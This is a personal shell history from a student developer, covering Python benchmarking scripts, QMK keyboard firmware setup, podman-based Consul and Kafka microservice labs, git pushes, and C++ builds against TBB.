+pip install tqdm matplotlib
+python -m venv venv
+pip install tqdm matplotlib
+python scripts/words_runner.py
+python scripts/words_runner.py --cfg_path tmp.cfg --exe_path bin/countwords_par 2 1
+v scripts/words_runner.py
+python scripts/words_runner.py --cfg_path all --exe_path bin/countwords_par 2 1
+v scripts/words_runner.py
+mkdir tmp
+ls
+ls tmp
+\rm tmp
+ls
+python scripts/words_runner.py --cfg_path all --exe_path bin/countwords_par 2 1
+mkdir tmp
+python scripts/words_runner.py --cfg_path all --exe_path bin/countwords_par 2 1
+\rm tmp -r
+python scripts/words_runner.py --cfg_path all --exe_path bin/countwords_par 2 1
+python scripts/words_runner.py --cfg_path all --exe_path bin/countwords_par 2 0
+v tmp
+ls
+python scripts/words_runner.py --exe_path bin/countwords_par 2 0
+python scripts/words_runner.py --cfg_path all --exe_path bin/countwords_par 2 0
+python scripts/words_runner.py 2 0
+python scripts/words_runner.py --cfg_path all 2 0
+python scripts/words_runner.py --cfg_path all --exe_path bin/countwords_par 2 0
+v scripts/words_runner.py
+ls
+mv 3 data
+python scripts/words_runner.py --cfg_path all --exe_path bin/countwords_par 2 0
+ls
+o time_indexing_comparison.png
+ll
+o mean_time_3d.png
+v scripts/count_words.py
+update
+flatpak --user update -y && flatpak update -y && tldr --update
+sudo dnf update -y
+j pri
+ssh -i id_ed25519 dedicated_persevere@185.130.46.132
+zshrc
+convim
+cd myukr
+ls
+v config.toml
+kuehlmak anneal -n40 -s3000
+cd myukr
+kuehlmak stats -s total,redirects,contorts,SFBs
+kuehlmak stats -s total,redirects,contorts,SFBs
+kuehlmak stats -s total,redirects,contorts,SFBs
+kuehlmak rank -n6 -s total,redirects,contorts,SFBs -p ranking
+ls
+mkdir try4
+mv ranking* try4
+\rm *.kbl
+v try4/ranking1.kbl
+ls
+j venvs
+cd .local/share
+cd venvs
+ls
+j proj
+cd ke
+cd Personal
+cd keyboard
+ls
+python -m venv venv
+v ../../../.sync_e
+v ../../../.sync-exclude.lst
+ls
+source venv/bin/activate
+pip install qmk
+ls /large/qmk_firmware
+qmk setup -H /large/qmk_firmware
+sudo dnf config-manager --help
+sudo trash /etc/yum.repos.d/_copr:copr.fedorainfracloud.org:*
+sudo trash /etc/yum.repos.d/google-chrome.repo
+sudo cp /large/qmk_firmware/util/udev/50-qmk.rules /etc/udev/rules.d/
+qmk setup -H /large/qmk_firmware
+sudo dnf install arm-none-eabi-gcc
+v dotfiles/scripts/install_fedora.sh
+sudo dnf install -y arm-none-eabi-gcc avr-gcc avrdude dfu-programmer dfu-util
+sudo dnf install arm-none-eabi-gcc avr-gcc avrdude dfu-programmer dfu-util
+sudo dnf install avr-gcc avrdude dfu-programmer dfu-util
+sudo dnf install avr-gcc avrdude dfu-util
+qmk setup -H /large/qmk_firmware
+sudo dnf install dfu-programmer
+sudo dnf install dfu-programmer
+sudo dnf copr enable erovia/dfu-programmer
+sudo dnf install dfu-programmer
+qmk setup -H /large/qmk_firmware
+sudo dnf remove arm-none-eabi-gcc avr-gcc avrdude dfu-programmer dfu-util
+qmk setup -H /large/qmk_firmware
+pip history
+qmk flash -h
+qmk flash beekeeb_piantor_pro_rad1an.json
+ls
+j apz
+ls
+git clone git@github.com:rhusiev-student/s6_apz_lab5.git
+mv s6_apz_lab5 lab5
+cd lab5
+cp ../lab4/* . -r
+la ../lab4/.
+cp ../lab4/.* -r
+cp ../lab4/.gitignore . -r
+git add .
+git commit -m "Move files from previous hw"
+git push
+ls
+v messages/run.sh
+v messages/src/main.py
+v messages/run.sh
+cd messages
+cd ..
+ls
+v logging/src/main.py
+cd logging
+cd ..
+v messages/run.sh
+v messages/run.sh
+\rm messages/run.sh
+v messages/src/main.py
+v messages/src/main.py
+v facade/src/main.py
+v config/src/config.py
+\rm -r img
+ls
+v README.md
+v kafka_setup.sh
+v setup_networks.sh
+podman network list
+v kafka_setup.sh
+ls
+git add .
+git commit -m "Make some args optional if on localhost, add network setup"
+git push
+podman run \\
+    -d \\
+    -p 8500:8500 \\
+    -p 8600:8600/udp \\
+    --name=badger \\
+    docker.io/consul agent -server -ui -node=server-1 -bootstrap-expect=1 -client=0.0.0.0
+podman run \\
+    -d \\
+    -p 8500:8500 \\
+    -p 8600:8600/udp \\
+    --name=badger \\
+    docker.io:consul agent -server -ui -node=server-1 -bootstrap-expect=1 -client=0.0.0.0
+podman run \\
+    -d \\
+    -p 8500:8500 \\
+    -p 8600:8600/udp \\
+    --name=badger \\
+    docker.io/library/consul agent -server -ui -node=server-1 -bootstrap-expect=1 -client=0.0.0.0
+podman run \\
+    -d \\
+    -p 8500:8500 \\
+    -p 8600:8600/udp \\
+    --name=badger \\
+    consul agent -server -ui -node=server-1 -bootstrap-expect=1 -client=0.0.0.0
+podman run \\
+    -d \\
+    -p 8500:8500 \\
+    -p 8600:8600/udp \\
+    --name=badger \\
+    hashicorp/consul agent -server -ui -node=server-1 -bootstrap-expect=1 -client=0.0.0.0
+podman exec badger consul members
+podman run \\
+   --name=fox \\
+   consul agent -node=client-1 -retry-join=192.168.0.247
+podman exec badger consul members
+podman exec badger consul members
+podman run \\
+   --name=fox \\
+   consul agent -node=client-1 -retry-join=localhost
+podman ps -a
+podman stop fox
+podman rm fox
+podman run \\
+   --name=fox \\
+   consul agent -node=client-1 -retry-join=localhost
+podman rm fox
+podman run \\
+   --rm \\
+   --name=fox \\
+   consul agent -node=client-1 -retry-join=localhost
+podman exec badger consul members
+podman run \\
+   --rm \\
+   --name=fox \\
+   consul agent -node=client-1 -retry-join=10.8.0.2
+podman exec badger consul members
+podman ps -a
+podman exec badger consul members
+podman stop badger
+podman rm badger
+podman run \\
+    -d \\
+    --rm \\
+    -p 8500:8500 \\
+    -p 8600:8600/udp \\
+    --name=badger \\
+    hashicorp/consul agent -server -ui -node=server-1 -bootstrap-expect=1 -client=0.0.0.0
+podman logs badger
+podman exec badger consul members
+podman run \\
+   --rm \\
+   --name=fox \\
+   consul agent -node=client-1 -retry-join=192.168.0.247
+podman exec badger consul members
+podman exec badger consul members
+podman exec badger consul members
+podman image rm docker.io/hashicorp/consul:latest
+podman rm badger
+podman stop badger
+podman rm badger
+podman image rm docker.io/hashicorp/consul:latest
+podman pull consul
+podman pull consul:1.15.4
+podman run \\
+    -d \\
+    --rm \\
+    -p 8500:8500 \\
+    -p 8600:8600/udp \\
+    --name=badger \\
+    consul agent -server -ui -node=server-1 -bootstrap-expect=1 -client=0.0.0.0
+podman run \\
+    -d \\
+    --rm \\
+    -p 8500:8500 \\
+    -p 8600:8600/udp \\
+    --name=badger \\
+    consul:1.15.4 agent -server -ui -node=server-1 -bootstrap-expect=1 -client=0.0.0.0
+podman exec badger consul members
+podman run \\
+   --rm \\
+   --name=fox \\
+   consul agent -node=client-1 -retry-join=192.168.0.247
+podman run \\
+   --rm \\
+   --name=fox \\
+   consul:1.15.4 agent -node=client-1 -retry-join=192.168.0.247
+podman exec badger consul members
+podman ps -a
+podman stop -a
+podman ps -a
+podman network create consul-net
+podman run \\
+    -d \\
+    --network=consul-net \\
+    --rm \\
+    -p 8500:8500 \\
+    -p 8600:8600/udp \\
+    --name=badger \\
+    consul:1.15.4 agent -server -ui -node=server-1 -bootstrap-expect=1 -client=0.0.0.0
+podman exec badger consul members
+podman run \\
+   --network=consul-net \\
+   --rm \\
+   --name=fox \\
+   consul:1.15.4 agent -node=client-1 -retry-join=10.89.2.2
+podman run \\
+   --rm \\
+   --name=fox \\
+   consul:1.15.4 agent -node=client-1 -retry-join=192.168.0.247
+podman exec badger consul members
+podman exec badger consul members
+podman stop badger
+podman image rm docker.io/library/consul:1.15.4
+podman run \\
+   --network=consul-net \\
+   --rm \\
+   --name=fox \\
+   hashicorp/consul agent -node=client-1 -retry-join=10.89.2.2
+podman ps -a
+podman run \\
+    -d \\
+    --network=consul-net \\
+    --rm \\
+    -p 8500:8500 \\
+    -p 8600:8600/udp \\
+    --name=badger \\
+    hashicorp/consul agent -server -ui -node=server-1 -bootstrap-expect=1 -client=0.0.0.0
+podman run \\
+   --network=consul-net \\
+   --rm \\
+   --name=fox \\
+   hashicorp/consul agent -node=client-1 -retry-join=10.89.2.2
+podman exec badger consul members
+podman run \\
+   --network=consul-net \\
+   --rm \\
+   --name=fox \\
+   hashicorp/consul agent -node=client-1 -retry-join=10.89.2.5
+podman exec badger consul members
+podman exec badger consul members
+podman exec badger consul members
+podman run \\
+   --network=consul-net \\
+   --rm \\
+   --name=fox \\
+   hashicorp/consul agent -node=client-1 -retry-join=badger
+podman exec badger consul members
+podman run \\
+   --network=consul-net \\
+   -p 9001:9001 \\
+   -d \\
+   --name=weasel \\
+   hashicorp/counting-service:0.0.2
+;s
+ls
+podman exec fox /bin/sh -c "echo '{\"service\": {\"name\": \"counting\", \"tags\": [\"go\"], \"port\": 9001}}' >> /consul/config/counting.json"
+podman exec fox consul reload
+v consul_setup.sh
+v consul_setup.sh
+v consul_setup.sh
+v consul_setup.sh
+v consul_setup.sh
+v consul_setup.sh
+dig @127.0.0.1 -p 8600 counting.service.consul
+git add .
+git commit -m "Add a script to setup consul"
+git push
+podman ps -a
+podman ps -a
+v consul_config.hsl
+v consul_config.hcl
+v setup_networks.sh
+v consul_setup.sh
+mv consul_setup.sh setup_consul.sh
+ls
+v setup_consul.sh
+v setup_consul.sh
+ls
+v messages/src/main.py
+v logging/src/main.py
+v facade/src
+v facade/src/main.py
+v setup_consul.sh
+podman exec badger consul services register consul_config.hcl
+podman stop -a && podman rm -a
+v setup_consul.sh
+v setup_consul.sh
+podman ps -a
+sh setup_consul.sh
+v setup_consul.sh
+sh setup_consul.sh
+podman stop -a
+sh setup_consul.sh
+podman stop -a
+podman rm -a
+v setup_consul.sh
+sh setup_consul.sh
+v setup_consul.sh
+v setup_consul.sh
+podman stop -a
+sh setup_consul.sh
+v setup_consul.sh
+podman stop -a
+sh setup_consul.sh
+podman ps -a
+v setup_consul.sh
+podman logs c590777780e9bbf822bb58ec4b0fbe9911f81a4ba1adfad6e95e39881efd53a0
+v setup_consul.sh
+v setup_consul.sh
+podman stop -a
+podman run \\
+    -d \\
+    --network=consul-net \\
+    --rm \\
+    -p 8500:8500 \\
+    -p 8600:8600/udp \\
+    --name=badger \\
+    -v ./consul_config.hcl:/consul/config/consul_config.hcl \\
+    hashicorp/consul agent -server -ui -node=server-1 -bootstrap-expect=1 -client=0.0.0.0\
+
+podman watch
+podman ps watch
+podman ps -a
+v setup_consul.sh
+sh setup_consul.sh
+v setup_consul.sh
+podman stop -a
+sh setup_consul.sh
+podman stop -a
+podman run \\
+    -d \\
+    --network=consul-net \\
+    --rm \\
+    -p 8500:8500 \\
+    -p 8600:8600/udp \\
+    --name=badger \\
+    -v ./consul_config.hcl:/consul/config/consul_config.hcl \\
+    hashicorp/consul agent -server -ui -node=server-1 -bootstrap-expect=1 -client=0.0.0.0\
+
+podman run \\
+    --network=consul-net \\
+    --rm \\
+    -p 8500:8500 \\
+    -p 8600:8600/udp \\
+    --name=badger \\
+    -v ./consul_config.hcl:/consul/config/consul_config.hcl \\
+    hashicorp/consul agent -server -ui -node=server-1 -bootstrap-expect=1 -client=0.0.0.0\
+
+v setup_consul.sh
+podman stop -a
+sh setup_consul.sh
+v setup_consul.sh
+podman stop -a
+sh setup_consul.sh
+v setup_consul.sh
+trash consul_config.hcl
+cd messages
+ls
+v pyproject.toml
+poetry add python-concul
+poetry add concul
+poetry add python-consul
+eval $(poetry env activate)
+ls
+v src/main.py
+v src/main.py
+python src/main.py
+poetry add python-consul
+poetry add python-consul@latest
+v src/main.py
+ls
+poetry env list
+poetry remove python-consul
+v setup_consul.sh
+cd ..
+v setup_consul.sh
+cd messages
+poetry remove python-consul
+poetry add py-consul
+ls
+v src/main.py
+which python
+python src/main.py
+v src/main.py
+cd ..
+v setup_consul.sh
+sh setup_consul.sh
+podman stop -a
+sh setup_consul.sh
+podman stop -a
+sh setup_consul.sh
+podman logs fox
+podman logs fox
+podman logs fox
+podman exec badger consul members
+podman exec badger consul members
+podman stop -a
+sh setup_consul.sh
+podman logs fox
+podman logs fox
+podman logs fox
+podman logs fox
+podman logs fox
+podman logs fox
+podman logs fox
+podman logs fox
+podman logs fox
+podman stop -a
+sh setup_consul.sh
+podman logs fox
+python src/main.py
+v src/main.py
+python src/main.py
+python src/main.py 0
+v src/main.py
+podman logs fox
+podman stop -a
+v src/main.py
+poetry remove requests
+rg requests
+v pyproject.toml
+cd ..
+ls
+cd facade
+ls
+cd ..
+ls
+cd logging
+ls
+penv
+da
+penv
+poetry add py-consul
+v src/main.py
+v src/main.py
+python src/main.py 0
+sh setup_consul.sh
+python src/main.py 0
+podman stop -a
+v src/main.py
+podman rm -a
+cd ../facade
+ls
+v src/main.py
+da
+penv
+poetry add py-consul
+ls
+v src/
+cd facade
+ls
+penv
+v src/main.py
+v src/main.py
+podman ps -a
+sh setup_consul.sh
+j lab5
+ls
+cd facade
+ls
+penv
+python src/main.py 0
+poetry add aiohttp
+python src/main.py 0
+v src/main.py
+v src/main.py
+python src/main.py 0
+j lab
+ls
+cd logging
+ls
+penv
+python src/main.py 0
+j lab5
+cd messages
+penv
+python src/main.py 0
+mv kafka_setup.sh setup_kafka.sh
+sh setup_kafka.sh
+python src/main.py 0
+curl --styled-output -X POST "localhost:13226?message=ms10"
+curl --styled-output -X POST "localhost:14229?message=ms10"
+v src/main.py
+python src/main.py 0
+curl --styled-output -X POST "localhost:14229?message=ms10"
+podman stop -a
+podman rm -a
+ls
+podman ps -a
+j lab5
+ls
+j lab5
+j lab5
+j lab5
+cd facade
+cd messages 
+cd logging
+penv 
+python src/main.py 0
+penv
+python src/main.py 0
+sh setup_kafka.sh
+sh setup_consul.sh
+python src/main.py 0
+python src/main.py 0
+penv
+python src/main.py 0
+curl --styled-output -X POST "localhost:14229?message=ms10"
+penv
+v src/main.py
+penv
+v src/main.py
+python src/main.py 0
+curl --styled-output -X POST "localhost:14229?message=ms10"
+python src/main.py 0
+curl --styled-output -X POST "localhost:14229?message=ms10"
+python src/main.py 0
+curl --styled-output -X POST "localhost:14229?message=ms10"
+v src/main.py
+ls
+v src/main.py
+penv
+v src/main.py
+python src/main.py 0
+curl --styled-output -X POST "localhost:14229?message=ms10"
+curl --styled-output -X GET "localhost:13226"
+curl --styled-output -X GET "localhost:14229"
+v src/main.py
+v src/main.py
+python src/main.py 0
+curl --styled-output -X GET "localhost:14229"
+podman stop -a
+v src/main.py
+sh setup_consul.sh
+sh setup_kafka.sh
+podman stop -a
+podman rm -a
+python src/main.py 0
+ls
+podman rm -a
+sh start_one.sh
+alias d
+zshrc
+sh start_one.sh 0
+sh start_one.sh 0
+podman rm -a
+podman stop -a
+podman rm -a
+sh start_one.sh 0
+sh start_one.sh 0
+sh start_one.sh 0
+sh setup_consul.sh
+sh start_one.sh 0
+podman stop -a
+podman ps -a
+sh start_one.sh 0
+sh setup_consul.sh
+v setup_consul.sh
+podman stop -a
+sh setup_consul.sh
+sh start_one.sh 0
+sh start_one.sh 0
+python src/main.py 0
+sh setup_kafka.sh
+python src/main.py 0
+python src/main.py 0
+curl --styled-output -X GET "localhost:14229"
+sh start_one.sh 0
+sh start_one.sh 0
+curl --styled-output -X GET "localhost:14229"
+curl --styled-output -X POST "localhost:14229?message=ms10"
+curl --styled-output -X GET "localhost:14229"
+podman stop -a
+v setup_consul.sh
+v src/main.py
+podman stop -a
+ls
+v src/main.py
+v Dockerfile
+pip freeze > requirements.txt
+v requirements.txt
+v requirements.txt
+v Dockerfile
+alias cppbuild
+podman build . -t apz_messages
+alias cppcompile
+podman run --rm -ti -v .:/app:z
+podman run --rm -ti -v .:/app:z apz_messages:latest
+podman run --rm -ti -v .:/app:z apz_messages 0 10.8.0.2
+podman run --rm -ti -v .:/app:z apz_messages s
+podman run --rm -ti -v .:/app:z apz_messages:latest 0 10.8.0.2
+podman run --rm -ti -v .:/app:z apz_messages s
+podman run --rm -ti -v .:/app:z apz_messages 0 10.8.0.2
+podman run --rm -ti -v .:/app:z apz_messages src/main.py 0 10.8.0.2
+podman run --rm -ti -v .:/app:z apz_messages ls
+v Dockerfile
+j cpp-
+v project.Dockerfile
+podman build . -t apz_messages
+podman run --rm -ti -v .:/app:z apz_messages 0 10.8.0.2
+sh setup_consul.sh
+sh setup_consul.sh 10.8.0.2
+podman run --rm -ti -v .:/app:z apz_messages 0 10.8.0.2
+podman run --rm -ti -v .:/app:z apz_messages 0 10.8.0.2
+podman run --network=consul-net --rm -ti -v .:/app:z apz_messages 0 10.8.0.2
+podman run --network=consul-net --rm -ti -v .:/app:z apz_messages 0 10.8.0.2
+sh setup_kafka.sh
+podman stop -a
+podman rm -a
+sh setup_consul.sh 10.8.0.2
+sh setup_kafka.sh
+podman run --network=consul-net --rm -ti -v .:/app:z apz_messages 0 10.8.0.2
+v setup_kafka.sh
+v docker-compose.yml
+v src/main.py
+v docker-compose.yml
+curl 10.8.0.2:9092
+v docker-compose.yml
+python src/main.py apz_messages 0 10.8.0.2
+python src/main.py 0 10.8.0.2
+python src/main.py 0 10.8.0.2
+podman run --network=consul-net --rm -ti -v .:/app:z apz_messages 0 10.8.0.2
+podman exec badger consul members
+podman run --network=consul-net --rm -ti -v .:/app:z apz_messages 0 10.89.2.2
+podman run --entrypoint bash --network=consul-net --rm -ti -v .:/app:z apz_messages:latest
+v docker-compose.yml
+v docker-compose.yml
+podman network list
+podman stop -a
+podman rm -a
+v docker-compose.yml
+sh setup_kafka.sh
+ls
+sh setup_consul.sh 10.8.0.2
+podman run --network=consul-net --rm -ti -v .:/app:z apz_messages 0
+j ass
+ls
+v words_teams.txt
+python UCU_autotests/general/randomize.py words_teams.txt
+v words_teams.txt
+podman run --network=consul-net --rm -ti -v .:/app:z apz_messages 0
+podman ps -a
+podman run --entrypoint bash --network=consul-net --rm -ti -v .:/app:z apz_messages
+v src/main.py
+v setup_kafka.sh
+podman run --entrypoint bash --network=consul-net --rm -ti -v .:/app:z apz_messages
+podman run --network=consul-net --rm -ti -v .:/app:z apz_messages 0
+python src/main.py 0
+python src/main.py 0 10.8.0.2
+python src/main.py 0
+sh start_one.sh 0
+sh start_one.sh 0 10.8.0.2
+curl --styled-output -X GET "localhost:14229"
+v start_one.sh
+v start_one.sh
+v start_one.sh
+v Dockerfile
+pip freeze > requirements.txt
+podman build . -t apz_logging
+v start_one.sh
+sh start_one.sh 0
+sh start_one.sh 0 10.8.0.2
+podman ps -a
+sh start_one.sh 0 10.8.0.2
+curl --styled-output -X GET "localhost:14229"
+sh start_one.sh 0
+v start_one.sh
+v start_one.sh
+sh start_one.sh 0
+v start_one.sh
+ls
+sh start_one.sh 0
+v start_one.sh
+\rm start_one.sh
+v start_one.sh
+sh start_one.sh 0
+v start_one.sh
+sh start_one.sh 0
+v start_one.sh
+v start_one.sh
+sh start_one.sh 0
+v start_one.sh
+sh start_one.sh 0
+v start_one.sh
+sh start_one.sh 0
+v start_one.sh
+sh start_one.sh 0
+v start_one.sh
+v start_one.sh
+sh start_one.sh 0
+curl --styled-output -X GET "localhost:14229"
+python src/main.py 0
+curl --styled-output -X GET "localhost:14229"
+python src/main.py 0
+curl --styled-output -X GET "localhost:14229"
+podman stop -a
+podman rm -a
+v setup_consul.sh
+sh setup_consul.sh 10.8.0.2
+sh setup_kafka.sh
+sh start_one.sh 0
+sh start_one.sh 0 10.8.0.2
+python src/main.py 0
+curl --styled-output -X GET "localhost:14229"
+podman stop -a
+podman rm -a
+sh setup_kafka.sh
+sh setup_consul.sh 10.8.0.2
+podman stop -a
+sh setup_kafka.sh
+podman stop -a
+podman rm -a
+sh setup_kafka.sh
+sh setup_consul.sh 10.8.0.2
+sh start_one.sh 0
+python src/main.py 0
+curl --styled-output -X GET "localhost:14229"
+podman exec badger consul members
+python src/main.py 0
+curl --styled-output -X GET "localhost:14229"
+sh start_one.sh 0 10.8.0.2
+curl --styled-output -X GET "localhost:14229"
+v start_one.sh
+v Dockerfile
+pip freeze > requirements.txt
+podman build . -t apz_facade
+sh start_one.sh 0
+sh start_one.sh 0
+v start_one.sh
+v start_one.sh
+sh start_one.sh 0
+curl --styled-output -X GET "localhost:14229"
+sh start_one.sh 0
+curl --styled-output -X GET "localhost:14229"
+podman exec badger consul members
+sh start_one.sh 0
+sh start_one.sh 0
+podman stop logging-0
+sh start_one.sh 0 10.8.0.2
+curl --styled-output -X GET "localhost:14229"
+curl --styled-output -X GET "localhost:14229"
+sh start_one.sh 0
+curl --styled-output -X GET "localhost:14229"
+podman stop -a
+podman rm -a
+sh setup_consul.sh 10.8.0.2
+sh setup_kafka.sh
+sh start_one.sh 0 10.8.0.2
+sh start_one.sh 0
+sh start_one.sh 0
+curl --styled-output -X GET "localhost:14229"
+podman exec badger consul members
+sh start_one.sh 0
+curl --styled-output -X GET "localhost:14229"
+sh start_one.sh 0
+curl --styled-output -X GET "localhost:14229"
+curl --styled-output -X POST "localhost:14229?message=ms1"
+podman stop facade-0
+sh start_one.sh 0
+curl --styled-output -X POST "localhost:14229?message=ms1"
+curl --styled-output -X GET "localhost:14229"
+curl --styled-output -X POST "localhost:14229?message=ms2"
+curl --styled-output -X GET "localhost:14229"
+podman stop -a
+v start_one.sh
+v start_one.sh
+v setup_consul.sh
+v setup_consul.sh
+v src/main.py
+podman ps -a
+podman rm -a
+sh setup_kafka.sh
+sh setup_consul.sh 10.8.0.2
+sh start_one.sh
+sh start_one.sh 0 10.8.0.2
+sh start_one.sh 0
+sh start_one.sh 0
+sh start_one.sh 0
+curl --styled-output -X GET "localhost:14229"
+curl --styled-output -X POST "localhost:14229?message=ms1"
+curl --styled-output -X POST "localhost:14229?message=ms2"
+curl --styled-output -X GET "localhost:14229"
+podman stop -a
+podman rm -a
+v start_one.sh
+git add ..
+git status
+git commit -m "move everything to dockers with support for concul"
+git push
+ls -R ..
+tree ..
+sh setup_consul.sh 10.8.0.2
+podman stop -a
+sh setup_kafka.sh
+sh setup_consul.sh 10.8.0.2
+sh start_one.sh 0
+sh start_one.sh 0
+sh start_one.sh 0
+sh start_one.sh 0
+sh start_one.sh 0
+git diff
+poetry add grpcio-health-checking
+pip freeze > requirements.txt
+pip freeze > requirements.txt
+podman build . -t apz_logging
+podman ps -a
+sh start_one.sh 0 10.8.0.2
+sh start_one.sh 0
+sh start_one.sh 0
+podman stop logging-0
+sh start_one.sh 0 10.8.0.2
+podman stop logging-0
+sh start_one.sh 0 10.8.0.2
+sh start_one.sh 0
+sh start_one.sh 0
+podman kill -s KILL facade-0 messages-0 logging-0
+podman stop -a
+podman kill -a
+git add ..
+git add .
+glog
+git commit -m "Add healthcheck"
+git push
+git checkout -b micro_consul
+j lab5
+j lab5
+j lab5
+j lab5
+ls
+cd messages
+cd messages
+ls
+penv
+penv
+j lab5
+j lab5
+j lab5
+j lab5
+j lab5
+j lab5
+cd logging
+cd logging
+penv
+penv
+ls
+cd facade
+penv
+cd facade
+penv
+sh setup_consul.sh 10.8.0.2
+sh setup_kafka.sh
+podman stop -a
+podman rm -a
+sh setup_consul.sh 10.8.0.2
+sh setup_kafka.sh
+sh start_one.sh 0
+sh start_one.sh 0
+sh start_one.sh 1
+sh start_one.sh 0
+sh start_one.sh 1
+sh start_one.sh 0 10.8.0.2
+sh start_one.sh 1 10.8.0.2
+curl --styled-output -X GET "localhost:14229"
+curl --styled-output -X POST "localhost:14229?message=ms1"
+curl --styled-output -X POST "localhost:14229?message=ms2"
+curl --styled-output -X POST "localhost:14229?message=ms3"
+curl --styled-output -X POST "localhost:14229?message=ms4"
+curl --styled-output -X POST "localhost:14229?message=ms5"
+curl --styled-output -X POST "localhost:14229?message=ms6"
+curl --styled-output -X POST "localhost:14229?message=ms7"
+curl --styled-output -X POST "localhost:14229?message=ms8"
+curl --styled-output -X POST "localhost:14229?message=ms9"
+curl --styled-output -X POST "localhost:14229?message=ms10"
+podman kill -s KILL facade-0 messages-0 logging-0
+curl --styled-output -X GET "localhost:14230"
+curl --styled-output -X GET "localhost:14230"
+sh start_one.sh 0
+sh start_one.sh 0
+sh start_one.sh 0 10.8.0.2
+podman stop facade-0 messages-0 logging-0
+sh start_one.sh 0
+sh start_one.sh 0 10.8.0.2
+sh start_one.sh 0
+podman stop facade-0 messages-0 logging-0
+podman stop messages-0 logging-0
+podman stop logging-0
+podman stop -a
+podman rm -a
+cd ..
+git add ,
+git add .
+git commit -m "Add images"
+git push --set-upstream origin micro_consul
+v README.md
+git add .
+git commit -m "Add readme"
+git push
+git init
+git add .
+git commit -m "Initial commit"
+git push --set-upstream git@github.com:rhusiev-student/s6_uv_lab5.git main
+git push --set-upstream git@github.com:rhusiev-student/s6_uv_lab3.git main
+cd ../s6_uv_lab4
+git push --set-upstream git@github.com:rhusiev-student/s6_uv_lab4.git main
+cd ../s6_uv_lab5
+git push --set-upstream git@github.com:rhusiev-student/s6_uv_lab5.git main
+cd ../s6_uv_lab6
+git push --set-upstream git@github.com:rhusiev-student/s6_uv_lab6.git main
+j autot
+git pull
+cd acs/words_count
+v test_words.py
+git pull
+v test_words.py
+glog
+j autot
+cd acs/words_count
+v test_words.py
+j vec
+git pull
+cd ..
+git clone git@github.com:ucu-cs/lab3-my-vector-opyr_zaletskyi_husiev-1.git
+\rm -r lab3-my-vector-opyr_zaletskyi_husiev
+\rm -fr lab3-my-vector-opyr_zaletskyi_husiev
+cd lab3-my-vector-opyr_zaletskyi_husiev-1
+ls
+v include/vector_the_serene.hpp
+glog
+git diff 106dc61
+git diff 106dc61 > tmp
+v tmp
+\rm tmp
+v include/vector_the_serene.hpp
+v temp/cpp.cpp
+j lab6
+j lab6
+cd ..
+ls
+cd lab8-words-parallel
+ls
+v src/main.cpp
+у� у�
+o .
+ls
+ls supports
+cp ~/Templates/cpp_template/cmake ~/Templates/cpp_template/project.Dockerfile ~/Templates/cpp_template/compile.sh . -r
+git status
+cp /drive/Projects/ucu/acs/assistance/UCU_autotests/acs/words_count/test_words.py .
+python test_words.py parallel
+ls
+cd cmake-build-tests
+ls
+cmake ..
+cd ..
+v project.Dockerfile
+v project.Dockerfile
+cppbuild lab8check
+cppcompile lab8check -d
+cppcompile lab8check -p
+v supports/readConfig.h
+cpprun lab8check python test_words.py parallel
+cpprun lab8check python test_words.py parallel -c
+cpprun lab8check python test_words.py parallel
+cpprun lab8check python test_words.py parallel -C -s
+ls
+v main.cpp
+cd ..
+ls
+cd lab9-words-count-queue-korets_tserkovna_kotliarchuk__
+o .
+cp /drive/Projects/ucu/acs/assistance/UCU_autotests/acs/words_count/test_words.py .
+cp ~/Templates/cpp_template/cmake ~/Templates/cpp_template/project.Dockerfile ~/Templates/cpp_template/compile.sh . -r
+v include
+v include_notes.md
+v src/main_tbb.cpp
+cp ~/Templates/cpp_template/cmake ~/Templates/cpp_template/project.Dockerfile ~/Templates/cpp_template/compile.sh . -r
+cp /drive/Projects/ucu/acs/assistance/UCU_autotests/acs/words_count/test_words.py .
+./compile.sh -d
+./compile.sh -c
+./compile.sh -d
+v CMakeLists.txt
+la
+v CMakeLists.txt
+git clone https://github.com/uxlfoundation/oneTBB.git TBB
+ls
+./compile.sh -d
+\rm -rf TBB
+git clone https://github.com/blep/tbb.git TBB
+\rm -rf TBB
+git clone https://github.com/uxlfoundation/oneTBB.git TBB
+cd TBB
+git checkout tbb_2020
+cd ..
+./compile.sh -d
+ls
+./compile.sh -c
+ls
+./compile.sh -d
+cd -
+git checkout tbb_2019
+cd -
+./compile.sh -d
+cd -
+git checkout onetbb_2021
+cd -
+./compile.sh -d
+cd -
+git checkout onetbb_2018
+git checkout tbb_2018
+ls
+git checkout tbb_2017
+ls
+git checkout tbb_4.4
+ls
+cd ..
+\rm -rf TBB
+git clone https://github.com/wjakob/tbb.git TBB
+./compile.sh -d
+ls
+v CMakeLists.txt
+ls include
+v CMakeLists.txt
+\rm -rf TBB
+git clone https://github.com/uxlfoundation/oneTBB.git TBB
+./compile.sh -d
+cppcompile lab8check -d
+cppcompile lab8check -c
+cppcompile lab8check -d
+v test_words.py
+v CMakeLists.txt
+cppcompile lab8check -d
+cpprun lab8check python test_words.py parallel -C -s -b cmake-build-debug
+ls cmake-build-debug/
+v test_words.py
+cpprun lab8check python test_words.py parallel -C -s -b cmake-build-debug
+v src/
+cppcompile lab8check -d
+ls
+v include
+v include_notes.md
+cpprun lab8check python test_words.py parallel -C -s -b cmake-build-debug
+ls
+cpprun ./bin/countwords_par cfg/conf0.cfg
+v cfg/conf0.cfg
+python test_words.py parallel -p
+v cfg1.cfg
+v cfg1.conf
+cpprun lab8check ./bin/countwords_par cfg1.conf
+v cfg1.conf
+cpprun lab8check ./bin/countwords_par cfg1.conf
+v a
+v n
+ranger __tests__
+cpprun lab8check ./bin/countwords_par cfg1.conf
+cat a
+cat n
+cpprun lab8check python test_words.py parallel -C -s -b cmake-build-debug
+cpprun lab8check ./bin/countwords_par cfg1.conf
+cat a
+cat n
+v src/main_tbb.cpp
+cppcompile lab8check -d
+ls
+ll cmake-build-tests
+\rm -r cmake-build-tests
+v compile.sh
+cpprun lab8check cmake --build cmake-build-debug
+cpprun lab8check cmake --build cmake-build-debug --parallel 7
+cpprun lab8check ./bin/countwords_par cfg1.conf
+cpprun lab8check cmake --build cmake-build-debug --parallel 7
+cpprun lab8check ./bin/countwords_par cfg1.conf
+cpprun lab8check cmake --build cmake-build-debug --parallel 7
+cpprun lab8check ./bin/countwords_par cfg1.conf
+cpprun lab8check cmake --build cmake-build-debug --parallel 7
+cpprun lab8check ./bin/countwords_par cfg1.conf
+v compile.sh
+cpprun lab8check bash -c 'cd cmake-build-debug && cmake -DCMAKE_BUILD_TYPE=Debug -DCMAKE_INSTALL_PREFIX=.. ..'
+cpprun lab8check bash
+cppcompile lab8check -d
+cppcompile lab8check -c -d
+cppcompile lab8check -c
